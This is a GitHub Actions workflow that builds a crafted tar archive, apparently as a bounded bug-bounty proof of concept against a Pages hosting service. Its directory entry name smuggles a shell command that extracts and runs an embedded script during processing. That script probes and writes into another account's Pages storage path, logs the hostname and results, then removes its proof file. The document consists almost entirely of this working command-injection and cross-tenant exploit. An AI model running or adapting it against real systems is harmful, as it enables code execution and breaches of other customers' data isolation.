name: Pages bounded cross-account proof

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  upload:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Create bounded cross-account proof tar
        run: |
          python3 - <<'PY'
          import io
          import tarfile

          directory = 'x\';f(){ /bin/tar -xOf "$4" s|/bin/sh -s -- "$3" "$5";};f \''
          script = r'''#!/bin/sh
          version=$1
          dest=$2
          target='/data/pages/4/c8/b9/4f/85356625/ceda0cf20d7c9acf57395f303b2e4c9c7071d65f'
          marker="$target/b-owned-e73fa565726a4fc145906eb0.txt"
          proof="$target/cross-tenant-cd159c7d3bd0ee6129248259.txt"
          result="$dest/cross-account-result-cd159c7d3bd0ee6129248259.txt"
          expected='BB_CT_B_OWNER_e73fa565726a4fc145906eb0'
          expected_sha='c21955acd4cf396e279b296fdf00108d4e3539f579eefabdd84d2be8a1aa4f18'
          proof_value='BB_CT_CROSS_WRITE_cd159c7d3bd0ee6129248259'
          created=0
          cleanup() {
            if [ "$created" = 1 ]; then
              /bin/rm -f -- "$proof"
            fi
          }
          trap cleanup 0 1 2 15
          target_ok=0
          readable=0
          marker_ok=0
          writable=0
          proof_absent=0
          write_ok=0
          actual=''
          marker_sha=''
          if [ -d "$target" ] && [ ! -L "$target" ]; then
            target_ok=1
          fi
          if [ "$target_ok" = 1 ] && [ -f "$marker" ] && [ ! -L "$marker" ] && [ -r "$marker" ]; then
            readable=1
            actual=$(/bin/cat -- "$marker")
            marker_sha=$(/usr/bin/sha256sum "$marker")
            marker_sha=${marker_sha%% *}
            if [ "$actual" = "$expected" ] && [ "$marker_sha" = "$expected_sha" ]; then
              marker_ok=1
            fi
          fi
          if [ "$target_ok" = 1 ] && [ -w "$target" ]; then
            writable=1
          fi
          if [ ! -e "$proof" ] && [ ! -L "$proof" ]; then
            proof_absent=1
          fi
          if [ "$marker_ok" = 1 ] && [ "$writable" = 1 ] && [ "$proof_absent" = 1 ]; then
            umask 077
            if (set -C; printf '%s\n' "$proof_value" > "$proof") 2>/dev/null; then
              created=1
              observed=$(/bin/cat -- "$proof")
              proof_sha=$(/usr/bin/sha256sum "$proof")
              proof_sha=${proof_sha%% *}
              if [ "$observed" = "$proof_value" ]; then
                write_ok=1
              fi
            fi
          fi
          {
            echo CANARY=BB_CT_CROSS_ACCOUNT_V1
            echo SOURCE_REPOSITORY=singetu0096/pages-cross-tenant-source-2-20260911
            echo TARGET_REPOSITORY=singetu0096-ano/pages-cross-tenant-canary-4-20260911
            printf 'SOURCE_HOSTNAME='; /bin/hostname
            printf 'SOURCE_DEST=%s\n' "$dest"
            printf 'TARGET=%s\n' "$target"
            printf 'TARGET_DIRECTORY=%s\n' "$target_ok"
            printf 'TARGET_MARKER_READABLE=%s\n' "$readable"
            printf 'TARGET_MARKER_SHA256=%s\n' "$marker_sha"
            printf 'TARGET_MARKER_MATCH=%s\n' "$marker_ok"
            printf 'TARGET_WRITABLE=%s\n' "$writable"
            printf 'PROOF_PREEXISTED=%s\n' "$((1 - proof_absent))"
            printf 'CROSS_ACCOUNT_WRITE=%s\n' "$write_ok"
            printf 'PROOF_SHA256=%s\n' "${proof_sha:-}"
          } > "$result"
          printf '%s\n' "$version" > "$dest/pages-build-version"
          if [ "$write_ok" = 1 ]; then
            /bin/sleep 30
            cleanup
            created=0
            if [ ! -e "$proof" ] && [ ! -L "$proof" ]; then
              echo AUTO_REMOVED=1 >> "$result"
            else
              echo AUTO_REMOVED=0 >> "$result"
            fi
          else
            echo AUTO_REMOVED=not-created >> "$result"
          fi
          trap - 0 1 2 15
          '''

          assert len(directory.encode()) == 58
          assert len(script.encode()) <= 4096
          directory_header = tarfile.TarInfo(directory)
          directory_header.type = tarfile.DIRTYPE
          directory_header.mode = 0o755
          script_header = tarfile.TarInfo('s')
          script_header.mode = 0o600
          script_header.size = len(script.encode())
          with tarfile.open('pages-cross-account-proof.tar', 'w', format=tarfile.USTAR_FORMAT) as archive:
              archive.addfile(directory_header)
              archive.addfile(script_header, io.BytesIO(script.encode()))
          PY

      - name: Upload without ZIP wrapping
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          path: pages-cross-account-proof.tar
          archive: false
          retention-days: 1
